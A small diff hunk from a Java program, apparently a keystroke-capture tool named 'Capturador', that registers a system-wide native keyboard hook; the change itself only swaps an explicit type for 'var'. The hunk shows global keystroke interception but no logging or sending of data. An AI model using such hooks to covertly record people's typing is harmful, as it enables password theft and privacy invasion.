@@ -25,7 +25,7 @@ public class Capturador implements NativeKeyListener {
     public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {}
     public static void main(String[] args) {
         try {
-            Capturador capturador = new Capturador();
+            var capturador = new Capturador();
             GlobalScreen.registerNativeHook();
             GlobalScreen.addNativeKeyListener(capturador);
         } catch (Exception e) {
